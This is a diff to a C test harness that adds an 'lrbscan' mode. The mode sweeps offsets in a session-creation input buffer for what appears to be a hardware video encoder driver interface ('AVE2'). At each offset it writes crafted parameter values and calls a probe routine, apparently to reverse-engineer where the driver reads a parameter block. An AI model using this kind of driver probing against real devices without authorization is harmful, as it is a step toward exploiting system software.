@@ -207,6 +207,23 @@ int main(void) {
                 destroy_close(c);
             }
         }
+    } else if (test != NULL && strcmp(test, "lrbscan") == 0) {
+        /* v26: locate LRB param block {flags@o,B@o+8,C@o+c,D@o+10,E@o+14} inside create input window 0x28..0x228.
+           WorkPool OpenTask reads task+0x2c block; cmd payload comes from the 0x200 memcpy'd region. */
+        const char *patch = getenv("AVE2_MS_PATCH");
+        printf("=== lrbscan: probe LRB block origin in create input ===\n");
+        for (int o = 0x28; o + 0x18 <= 0x228; o += 4) {
+            if (create_session(1, &c) != 0) { printf("[-] create fail at o=0x%x\n", o); break; }
+            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
+            *(uint32_t *)(stat_in + o)        = 1;         /* flags -> s=2 */
+            *(uint32_t *)(stat_in + o + 0x8)  = 0x10000;   /* B */
+            *(uint32_t *)(stat_in + o + 0xc)  = 0x10000;   /* C */
+            *(uint32_t *)(stat_in + o + 0x10) = 4;         /* D */
+            *(uint32_t *)(stat_in + o + 0x14) = 4;         /* E */
+            sel4_p("lb", c, 0, 0x1a0a0, patch);
+            destroy_close(c);
+        }
+        printf("=== lrbscan done ===\n");
     } else {
         /* default battery: enctype sweep + no-create ladder */
         printf("\n=== S1 create m1: enctype sweep (static) ===\n");
